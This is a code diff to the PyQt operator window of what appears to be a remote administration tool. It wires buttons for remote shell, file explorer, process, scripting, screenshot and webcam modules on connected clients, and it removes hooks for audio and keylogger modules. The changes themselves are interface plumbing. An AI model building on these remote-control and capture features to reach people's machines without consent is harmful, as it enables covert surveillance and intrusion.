@@ -69,7 +69,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # update gui
         self.gui = QApplication.processEvents
 
-        self.portLabel.setText('[%s]' % str(self.PORT))
+
         self.ipv4Label.setText('[%s]' % str(self.IPADDRESS))
 
         # unlocked servers bank
@@ -115,6 +115,9 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # Init Filter Widgets
         self.init_filters()
 
+        # Update Menu Buttons
+        self.update_menu_buttons()
+
         # Hide Moderators Columns
         self.clientsTable.setColumnHidden(self.index_of_moderator, True)
         self.offlineClientsTable.setColumnHidden(0, True)
@@ -123,6 +126,24 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # Set Alias
         self.connect(QShortcut(QKeySequence(Qt.Key_F2), self), SIGNAL('activated()'), self.add_alias)
 
+        # Connect & Disconnect triggers
+        self.connectButton.clicked.connect(self.connect_to_server)
+        self.disconnectButton.clicked.connect(self.disconnect_from_server)
+
+        # Menu Triggers
+        self.viewLogsButton.clicked.connect(self.view_logs)
+        # TODO: log settings trigger
+        self.setAliasButton.clicked.connect(self.add_alias)
+        self.lockedButton.clicked.connect(self.unlock_client)
+        self.unlockedButton.clicked.connect(self.lock_client)
+        self.shellButton.clicked.connect(lambda: self.execute_module(module='shell'))
+        self.explorerButton.clicked.connect(lambda: self.execute_module(module='explorer'))
+        self.proccessesButton.clicked.connect(lambda: self.execute_module(module='processes'))
+        self.scriptingButton.clicked.connect(lambda: self.execute_module(module='scripting'))
+        self.screenshotButton.clicked.connect(self.get_desktop_preview)
+        self.webcamButton.clicked.connect(self.get_webcam_preview)
+        self.setModeratorButton.clicked.connect(self.administrator_set_moderator)
+
         # servers table double click trigger
         self.clientsTable.doubleClicked.connect(self.unlock_client)
         # Initializing right click menu
@@ -130,23 +151,18 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.connect(self.clientsTable, SIGNAL('customContextMenuRequested(const QPoint&)'),
                      self.server_right_click_menu)
 
-        # self.clientsTable.clicked.connect(self.get_preview)
-
-        # Triggers
-        self.actionStartListen_for_connections.triggered.connect(self.connect_to_server)
-        self.actionStopListen_for_connections.triggered.connect(self.disconnect_from_server)
-        self.actionViewer_Configuration.triggered.connect(self.run_settings)
+        # update menu button on click
+        self.clientsTable.clicked.connect(self.update_menu_buttons)
 
         # ADMINISTRATOR BUTTONS
         self.getModeratorsButton.clicked.connect(self.get_moderators)
         self.addModeratorButton.clicked.connect(self.add_moderator)
 
         # Custom signal for update server table
+        self.connect(self, SIGNAL('updateMenu()'), self.update_menu_buttons)
         self.connect(self, SIGNAL('updateTable()'), self.update_servers_table)
         self.connect(self, SIGNAL('executeShell()'), lambda: self.execute_module(module='shell'))
         self.connect(self, SIGNAL('executeExplorer()'), lambda: self.execute_module(module='explorer'))
-        self.connect(self, SIGNAL('executeAudio()'), lambda: self.execute_module(module='audio'))
-        self.connect(self, SIGNAL('executeKeylogger()'), lambda: self.execute_module(module='keylogger'))
         self.connect(self, SIGNAL('executeScripting()'), lambda: self.execute_module(module='scripting'))
         self.connect(self, SIGNAL('executeProcesses()'), lambda: self.execute_module(module='processes'))
 
@@ -414,9 +430,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
         # BOTTOM
         self.loginStatusLabel.setText(_('BOTTOM_LOGIN_STATUS'))
-        self.clientStatusLabel.setText(_('BOTTOM_STATUS'))
         self.ipv4TextLabel.setText(_('BOTTOM_IPV4'))
-        self.portTextLabel.setText(_('BOTTOM_PORT'))
         self.serversOnlineStatus.setText(_('BOTTOM_SERVERS_TOTAL'))
         # END BOTTOM
 
@@ -459,13 +473,13 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                                 self.servers_checker_thread = threading.Thread(target=self.check_servers, args=(self.session_id,))
                                 self.servers_checker_thread.start()
 
-                                # Gui
-                                self.actionStopListen_for_connections.setDisabled(False)
-                                self.actionStartListen_for_connections.setDisabled(True)
+                                # Set Login Status to Online
+                                self.loginStatusLabel.setText(self.session_id)
+                                self.loginStatusLabel.setStyleSheet('color: #2ecc71')
+                                self.connectionStatusButton.setIcon(QIcon(QPixmap(":/icons/assets/connection.png")))
 
-                                # Status Change
-                                self.statusLabel.setText('Online')
-                                self.statusLabel.setStyleSheet('color: #1abc9c;')
+                                # Buttons
+                                self.connectButton.setChecked(True)
 
                                 return
                             elif data['payload'] == 'loginError':
@@ -473,11 +487,54 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                                 ans = warn.exec_()
                                 continue
                         else:
+                            self.connectButton.setChecked(False)
                             return
                     else:
+                        self.connectButton.setChecked(False)
                         return
         except socket.error:
+            self.connectButton.setChecked(False)
             return
+
+    def update_menu_buttons(self):
+        try:
+
+            client = self.current_client()
+            if self.streaming_socks[client]['webcamera_device'] == 'NoDevice':
+                self.webcamButton.setHidden(True)
+            else:
+                self.webcamButton.setHidden(False)
+
+            if self.privs == 1:
+                self.setModeratorButton.setHidden(False)
+            else:
+                self.setModeratorButton.setHidden(True)
+
+            if self.clientsTable.item(self.clientsTable.currentRow(), self.index_of_lock).text() == _('INFO_LOCKED'):
+                self.onlineGroup.setHidden(False)
+                self.viewLogsButton.setHidden(False)
+                self.logSettingsButton.setHidden(False)
+                self.setAliasButton.setHidden(False)
+                self.unlockedButton.setHidden(True)
+                self.lockedButton.setHidden(False)
+                self.shellButton.setHidden(True)
+                self.explorerButton.setHidden(True)
+                self.proccessesButton.setHidden(True)
+                self.scriptingButton.setHidden(True)
+            else:
+                self.onlineGroup.setHidden(False)
+                self.viewLogsButton.setHidden(False)
+                self.logSettingsButton.setHidden(False)
+                self.setAliasButton.setHidden(False)
+                self.unlockedButton.setHidden(False)
+                self.lockedButton.setHidden(True)
+                self.shellButton.setHidden(False)
+                self.explorerButton.setHidden(False)
+                self.proccessesButton.setHidden(False)
+                self.scriptingButton.setHidden(False)
+
+        except:
+            self.onlineGroup.setHidden(True)
 
     # Enable Administrators Features
     def enable_administrator(self):
@@ -487,9 +544,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.offlineClientsTable.showColumn(0)
         # Moderators Tab
         self.clientsTabs.setTabEnabled(2, True)
-        # Set Status
-        self.loginStatusLabel.setText(_(self.session_id))
-        self.loginStatusLabel.setStyleSheet('color: #9b59b6')
+        self.clientsTabs.setTabIcon(2, QIcon(QPixmap(":/icons/assets/moderators.png")))
 
     # Disable Administrators Features
     def disable_administrator(self):
@@ -499,13 +554,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.offlineClientsTable.setColumnHidden(0, True)
         # Moderators Tab
         self.clientsTabs.setTabEnabled(2, False)
-        # Set Status
-        try:
-            self.loginStatusLabel.setText(_(self.session_id))
-            self.loginStatusLabel.setStyleSheet('color: #e67e22')
-        except AttributeError:
-            self.loginStatusLabel.setText(_('BOTTOM_LOGIN_STATUS'))
-            self.loginStatusLabel.setStyleSheet('color: #e74c3c')
+        self.clientsTabs.setTabIcon(2, QIcon(QPixmap(":/icons/assets/none.png")))
 
     def disconnect_from_server(self):
         # Clear Content
@@ -515,14 +564,10 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.acceptthreadState = False
 
         del self.connection_socket
-        del self.checker_socket
-
-        self.actionStopListen_for_connections.setDisabled(True)
-        self.actionStartListen_for_connections.setDisabled(False)
-
-        # Change Status
-        self.statusLabel.setText('Offline')
-        self.statusLabel.setStyleSheet('color: #d35400;')
+        try:
+            del self.checker_socket
+        except AttributeError:
+            pass
 
         # Clients count
         self.onlineStatus.setText('0')
@@ -533,6 +578,10 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         # Set Login Status to None
         self.loginStatusLabel.setText(_('BOTTOM_LOGIN_STATUS'))
         self.loginStatusLabel.setStyleSheet('color: #e74c3c')
+        self.connectionStatusButton.setIcon(QIcon(QPixmap(":/icons/assets/no_connection.png")))
+
+        # Buttons
+        self.connectButton.setChecked(False)
 
     def check_servers(self, session_id):
         # Init Checker Socket
@@ -543,6 +592,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 try:
                     data = data_get(self.checker_socket, 'getClients', 'getClients', session_id)
                     self.streaming_socks = data['payload']
+                    self.emit(SIGNAL('updateMenu()'))
                     self.emit(SIGNAL('updateTable()'))
                     time.sleep(3)
                 except socket.error:
@@ -666,7 +716,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                     privs_status = _('INFO_USER') if not online_clients[obj]['privileges'] == '1' else _(
                         'INFO_ADMIN')
                 except KeyError:
-                    print online_clients[obj]
+                    pass
                 item = QTableWidgetItem()
                 if privs_status == _('INFO_ADMIN'):
                     item.setIcon(QIcon(os.path.join(assets, 'admin.png')))
@@ -864,7 +914,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 'assets': assets,
             }
             module_id = id_generator()
-            print module
             if module in modules:
                 self.modulesBank[module_id] = modules[module].mainPopup(args)
                 self.modulesBank[module_id].show()
@@ -914,7 +963,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         if self.privs == 1:
             try:
                 all_moderators = data_get(self.connection_socket, 'getModerators', 'getModerators', session_id=self.session_id)
-                print all_moderators
             except SyntaxError:
                 return
 
